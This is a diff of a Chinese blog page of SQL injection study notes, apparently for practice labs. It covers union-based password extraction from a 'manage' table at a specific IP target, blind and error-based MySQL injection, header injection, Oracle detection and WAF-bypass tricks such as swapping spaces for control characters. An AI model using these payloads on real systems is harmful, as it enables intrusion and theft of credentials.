@@ -43,13 +43,13 @@
 <meta property="og:site_name" content="Hades">
 <meta property="og:description" content="SQL注入1.常见的几种数据库数据库accessmssqlmysqlsqlseveroraclesqlite2.注入方法和流程Access逐字猜解法： 猜表名：exists 指定一个子查询 返回值为布尔类型 eg：and exists（子查询） 猜列名：and （select top 1 len （列名）from 表名 ）&amp;gt;n 联合查询： order by 判断字段 union select">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="d:%5CGit%5CBlog%5Chexo%5Cthemes%5Chexo-theme-icalm%5Csource%5Cimg%5C2.png">
-<meta property="og:image" content="d:%5CGit%5CBlog%5Chexo%5Cthemes%5Chexo-theme-icalm%5Csource%5Cimg%5C1.png">
-<meta property="og:updated_time" content="2019-08-12T12:07:12.754Z">
+<meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/3.png">
+<meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/4.png">
+<meta property="og:updated_time" content="2019-08-13T04:28:02.794Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sql注入">
 <meta name="twitter:description" content="SQL注入1.常见的几种数据库数据库accessmssqlmysqlsqlseveroraclesqlite2.注入方法和流程Access逐字猜解法： 猜表名：exists 指定一个子查询 返回值为布尔类型 eg：and exists（子查询） 猜列名：and （select top 1 len （列名）from 表名 ）&amp;gt;n 联合查询： order by 判断字段 union select">
-<meta name="twitter:image" content="d:%5CGit%5CBlog%5Chexo%5Cthemes%5Chexo-theme-icalm%5Csource%5Cimg%5C2.png">
+<meta name="twitter:image" content="http://pw5q6scnw.bkt.clouddn.com/3.png">
 
 
 <link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1">
@@ -148,19 +148,19 @@
 
 <h3 id="Mssql（Sqlsevre）"><a href="#Mssql（Sqlsevre）" class="headerlink" title="Mssql（Sqlsevre）"></a>Mssql（Sqlsevre）</h3><p>权限：sa/db db_ower/public/</p>
 <p>判断数据库类型:</p>
-<p>and ecists (select * from sysobjects)</p>
-<p>and exists (select count(*) from sysobjects)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and ecists (select * from sysobjects)</span><br><span class="line">and exists (select count(*) from sysobjects)</span><br></pre></td></tr></table></figure>
+
 <p>判断数据库版本：</p>
 <p>有回显：and =@@version()</p>
 <p>无回显：and substr（(select @@version),22,4）</p>
 <p>判断字段数：order by… / union all select null,不会自动去掉重复 使用时将前查询屏蔽/union自动去重</p>
 <p>找回显位：使用null 有字符型和数字型</p>
-<p><a href="http://219.153.49.228:45660/new_list.asp?id=-2" target="_blank" rel="noopener">http://xxxxxxxxxxx/new_list.asp?id=-2</a> union all select null,(select password from manage),null,null</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxxxxxxxx/new_list.asp?id=-2](http://219.153.49.228:45660/new_list.asp?id=-2) union all select null,(select password from manage),null,null</span><br></pre></td></tr></table></figure>
+
 <p>爆库名：db_name()  db_name(1)</p>
-<p>爆表名：union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=’u’),’3’,4</p>
-<p>union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=’u’ and name not in (‘manage’)),’3’,4</p>
-<p>union all select null,(select top 1 col_name(object_id(‘manage’),1) from sysobjects),null,null</p>
-<p>dbo.sysobjects//存储对象可爆破表  xtype=’u’  //查看用户表</p>
+<p>爆表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=&apos;u&apos;),&apos;3&apos;,4</span><br><span class="line">union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=&apos;u&apos; and name not in (&apos;manage&apos;)),&apos;3&apos;,4</span><br><span class="line"></span><br><span class="line">union all select null,(select top 1 col_name(object_id(&apos;manage&apos;),1) from sysobjects),null,null</span><br><span class="line"></span><br><span class="line">dbo.sysobjects//存储对象可爆破表  xtype=&apos;u&apos;  //查看用户表</span><br></pre></td></tr></table></figure>
+
 <h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h3><p>mysql常用语句：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">select version（）#查看mysql版本</span><br><span class="line">select @@global.version_compile_Os #查看当前系统</span><br><span class="line">select user（）#查看使用者</span><br><span class="line">select @@basedir（）#查询数据库所在位置 可在phpmyadmin提权时获取日志目录</span><br><span class="line">select database() #查询是否选择了数据库</span><br><span class="line"></span><br><span class="line">show databases; #查询数据库</span><br><span class="line">use databases_name; #选择数据库</span><br><span class="line">show tables; #查询选择的数据库的表</span><br><span class="line">desc 表名; #查询一个表的结构</span><br><span class="line">create databases 数据库名; #创建数据库</span><br><span class="line">drop databases 数据库名; #删除数据库</span><br><span class="line">create table [ if not exists ] `表名`（</span><br><span class="line">    `字段名`  数据类型  数据属性,</span><br><span class="line">    `字段名`  数据类型  数据属性,</span><br><span class="line">    `字段名`  数据类型  数据属性,</span><br><span class="line">    ...</span><br><span class="line">    `字段名`  数据类型  数据属性 (最后一个字段分隔符, 不能加)</span><br><span class="line">）engine=数据库引擎 default charset=编码类型;    #创建数据表</span><br><span class="line">create table new_table like old_tabe 根据存在的表建立新表；</span><br><span class="line">alter table 表名 add 字段 属性   #表中插入字段</span><br></pre></td></tr></table></figure>
 
@@ -203,19 +203,19 @@
 <p>判错  &gt;&gt;  查询字段数  &gt;&gt;  union select  &gt;&gt;  数据库 表名 字段名</p>
 <p>盲注：</p>
 <p>基于布尔的盲注：</p>
-<p>利用函数构造布尔值返回，判断信息。 eg：substr（version（）,2,1）=0 </p>
+<p>利用函数构造布尔值返回，判断信息。 eg：substr(version(),2,1)=0 </p>
 <p>基于时间的盲注：</p>
-<p>使用if等构造逻辑判断，根据返回时间判断信息。 eg：if（substr（version()1,1）= 5,sleep(10),1）</p>
+<p>使用if等构造逻辑判断，根据返回时间判断信息。 eg：if(substr(version()1,1)= 5,sleep(10),1）</p>
 <p>基于报错的注入：</p>
 <ul>
 <li>bigint等数据类型溢出</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select (select * from (select user())x);</span><br><span class="line">select !(select * from (select user())x);</span><br><span class="line">select !(select * from (select user())x)+1;</span><br></pre></td></tr></table></figure>
 
-<p><img src="D:%5CGit%5CBlog%5Chexo%5Cthemes%5Chexo-theme-icalm%5Csource%5Cimg%5C2.png" alt="2"></p>
+<p><img src="http://pw5q6scnw.bkt.clouddn.com/3.png" alt="2"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exp(~(select*from(select user())x));</span><br></pre></td></tr></table></figure>
 
-<p><del>的意思为按位取反，如</del>0 = 18446744073709551615 大于5.5.53不可用</p>
+<p>~的意思为按位取反，如~0 = 18446744073709551615 大于5.5.53不可用</p>
 <ul>
 <li>主键重复</li>
 <li>列名重复</li>
@@ -235,7 +235,7 @@
 <ul>
 <li>xff注入（http头注入）</li>
 </ul>
-<p><img src="D:%5CGit%5CBlog%5Chexo%5Cthemes%5Chexo-theme-icalm%5Csource%5Cimg%5C1.png" alt="1"></p>
+<p><img src="http://pw5q6scnw.bkt.clouddn.com/4.png" alt="1"></p>
 <h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p>判断是否为oracle 数据库</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from user_tables)&gt;0</span><br><span class="line">and (select count(*) from dual) &gt;0</span><br></pre></td></tr></table></figure>
 
@@ -274,10 +274,12 @@
 <p>news_id=1.1 </p>
 <p>new_id=1E0 </p>
 <p>news_id=\N</p>
-<p>位置2可利用其他控制字符替换空格 %09 %0a  %0b %0c %0d %20 %a%09 %0a  %0b %0c %0d %20 %a</p>
+<p>位置2</p>
+<p>可利用其他控制字符替换空格 %09 %0a  %0b %0c %0d %20 %a%09 %0a  %0b %0c %0d %20 %a</p>
 <p>利用注释符号 /* */ #test%0d%0a –+a</p>
 <p>可利用括号 union （select 1,2）</p>
-<p>位置3其他字符替换空格 %09 %0a  %0b %0c %0d %20 %a0 </p>
+<p>位置3</p>
+<p>其他字符替换空格 %09 %0a  %0b %0c %0d %20 %a0 </p>
 <p>利用注释符号  /* */ #test%0d%0a –+a</p>
 <p>可利用其他符号：+ - ~ ！ @</p>
 <p>位置4</p>
@@ -286,7 +288,8 @@
 <p>可利用数学运算以及数据类型：union select user(),2 0 from admin</p>
 <p>union select user(),8eofrom admin</p>
 <p>union select user(),\Nfrom admin</p>
-<p>位置五可利用其他控制字符替换空格 %09 %0a  %0b %0c %0d %20 %a%09 %0a  %0b %0c %0d %20 %a</p>
+<p>位置5</p>
+<p>可利用其他控制字符替换空格 %09 %0a  %0b %0c %0d %20 %a%09 %0a  %0b %0c %0d %20 %a</p>
 <p>利用注释符号 /**/ #test%0d%0a –+a</p>
 <p>超长数据包pass：</p>
 <p>get型请求转post型</p>
